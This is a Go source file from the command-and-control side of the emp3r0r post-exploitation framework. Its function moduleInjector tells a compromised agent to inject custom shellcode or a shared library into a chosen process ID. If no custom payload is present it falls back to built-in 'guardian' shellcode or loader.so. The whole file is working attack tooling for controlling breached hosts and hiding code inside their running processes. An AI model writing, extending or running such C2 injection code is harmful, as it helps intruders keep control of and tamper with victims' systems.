package cc

import (
	"fmt"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func moduleInjector() {
	// target
	target := ActiveAgent
	if target == nil {
		LogError("Target not exist")
		return
	}
	if AvailableModuleOptions["method"] == nil || AvailableModuleOptions["pid"] == nil {
		LogError("One or more required options are nil")
		return
	}
	method := AvailableModuleOptions["method"].Val

	checksum := ""
	shellcode_file := "shellcode.txt"
	so_file := "to_inject.so"

	// shellcode.txt
	pid := AvailableModuleOptions["pid"].Val
	if method == "shellcode" && !util.IsExist(WWWRoot+shellcode_file) {
		LogWarning("Custom shellcode '%s%s' does not exist, will inject guardian shellcode", WWWRoot, shellcode_file)
	} else {
		checksum = tun.SHA256SumFile(WWWRoot + shellcode_file)
	}

	// to_inject.so
	if method == "shared_library" && !util.IsExist(WWWRoot+so_file) {
		LogWarning("Custom library '%s%s' does not exist, will inject loader.so instead", WWWRoot, so_file)
	} else {
		checksum = tun.SHA256SumFile(WWWRoot + so_file)
	}

	// injector cmd
	cmd := fmt.Sprintf("%s --method %s --pid %s --checksum %s", emp3r0r_def.C2CmdInject, method, pid, checksum)

	// tell agent to inject
	err := SendCmd(cmd, "", target)
	if err != nil {
		LogError("Could not send command (%s) to agent: %v", cmd, err)
		return
	}
	LogMsg("Please wait...")
}
